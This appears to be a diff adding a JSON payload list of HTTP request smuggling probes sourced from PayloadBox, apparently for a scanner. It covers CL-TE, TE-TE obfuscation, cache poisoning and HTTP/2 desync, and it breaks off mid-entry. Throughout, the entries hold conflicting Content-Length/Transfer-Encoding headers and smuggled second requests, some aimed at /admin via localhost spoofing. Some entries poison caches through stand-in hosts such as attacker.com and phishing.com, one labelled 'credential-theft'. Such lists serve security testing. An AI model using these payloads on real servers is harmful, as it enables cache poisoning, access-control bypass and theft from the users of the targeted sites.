+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "96",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #47",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /phpinfo.php HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-PHP": "info"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #48",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "109",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #49",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /server-status HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Apache": "status"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #50",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "125",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #51",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /actuator/env HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Spring-Boot": "actuator"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #52",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "8",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nPROBE",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #53",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "10",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nDETECTION",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "120",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /static/include.js HTTP/1.1",
+    "headers": {
+      "Host": "evil-attacker.com",
+      "X-Cache-Poisoning": "true"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "76",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt, Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Forwarded-Host": "malicious.com"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /images/logo.png HTTP/1.1",
+    "headers": {
+      "Host": "evil-server.com",
+      "X-Cache-Key": "poisoned"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "8e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Forwarded-Host": "evil.com",
+      "X-Cache": "poisoned"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /api/javascript HTTP/1.1",
+    "headers": {
+      "Host": "attacker.com",
+      "X-Forwarded-Host": "attacker.com",
+      "X-Poison-Cache": "yes"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /public/style.css HTTP/1.1",
+    "headers": {
+      "Host": "evil.com",
+      "Referer": "https://evil.com/",
+      "X-Cache-Status": "HIT"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "148",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Forwarded-Host": "attacker.com",
+      "Accept-Language": "en",
+      "X-Cache-Key": "custom"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "9a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /widgets/widget.js HTTP/1.1",
+    "headers": {
+      "Host": "evil-widgets.com",
+      "Origin": "https://evil-widgets.com",
+      "X-Poison": "active"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /checkout/payment HTTP/1.1",
+    "headers": {
+      "Host": "payment-hijacker.com",
+      "X-Forwarded-Proto": "https",
+      "X-Cache-Poison": "critical"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "72",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt, Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Cache Poisoning Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Cache-Poisoning-Payloads.txt). Target request line: GET /login HTTP/1.1",
+    "headers": {
+      "Host": "phishing.com",
+      "X-Poisoned": "credential-theft"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "6"
+    },
+    "body": "0\\r\\n\\r\\nX",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "1\\r\\nA\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "3\\r\\nabc\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5\\r\\nSLEEP\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "identity"
+    },
+    "body": "5c\\r\\nGPOST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "Transfer-encoding": "chunked"
+    },
+    "body": "5e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "12\\r\\nTESTSMUGGLING\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /404 HTTP/1.1",
+    "headers": {
+      "X": "Y"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "6"
+    },
+    "body": "0\\r\\n\\r\\nPROBE",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "3",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "6\\r\\nPREFIX\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "7\\r\\nTESTING\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "2e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nDETECT",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "1e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /nonexistent HTTP/1.1",
+    "headers": {},
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x"
+    },
+    "body": "44",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /404 HTTP/1.1",
+    "headers": {
+      "X-Test-Header": "smuggled"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "8"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLE",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "identity"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "10",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nDETECTION",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #21",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "a\\r\\nVULNERABLE\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "Transfer-encoding": "cow"
+    },
+    "body": "5a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /probe HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Detection": "test"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "15",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nTIMEOUTTEST",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "28",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /detect HTTP/1.1",
+    "headers": {
+      "Foo": "bar"
+    },
+    "body": "0\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /404 HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0\\r\\ncontent-length: 4\\r\\n\\r\\nTEST\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nFoo: bar\\r\\n\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n\\r\\n\\r\\n0\\r\\n\\r\\n\\r\\n",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /test HTTP/1.1\\r\\n",
+    "headers": {
+      "Host": "vulnerable-website.com\\r\\n"
+    },
+    "body": "\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #29",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "8",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nTESTDATA",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "xchunked"
+    },
+    "body": "52",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST /detect HTTP/1.1",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "10"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLETEST",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "[tab]chunked"
+    },
+    "body": "38",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #34",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: GET /probe404 HTTP/1.1",
+    "headers": {
+      "X-Test": "value"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Detection Payloads #35",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Detection-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "12",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nDETECTIONEND",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Detection-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: POST / HTTP/2",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "0"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /404 HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\ncontent-length: 0\\r\\ntransfer-encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 8\\r\\n\\r\\nSMUGGLED\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /admin\\r\\n:authority: localhost\\r\\ncontent-length: 0\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 50",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "localhost"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /\\r\\n:authority: vulnerable-website.com\\r\\nfoo: bar\\r\\ncontent-length: 50",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /test HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com"
+    },
+    "body": "\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 0\\r\\nX-Custom-Header: inject\\r\\n\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n\\r\\n\\r\\n0\\r\\n\\r\\n\\r\\n",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /smuggled HTTP/1.1\\r\\n",
+    "headers": {},
+    "body": "\\r\\n\\r\\n\\r\\nPOST / HTTP/2\\r\\nHost: vulnerable-website.com\\r\\n:method: POST\\r\\n:path: /api\\r\\n:authority: vulnerable-website.com\\r\\ncontent-length: 0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "HTTP2-Desync-Payloads.txt"
+  },
+  {
+    "name": "Http2 Desync Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (HTTP2-Desync-Payloads.txt). Target request line: GET /api/users HTTP/1.1",
+    "headers": {
+      "X-API-Key": "smuggled"
+    },
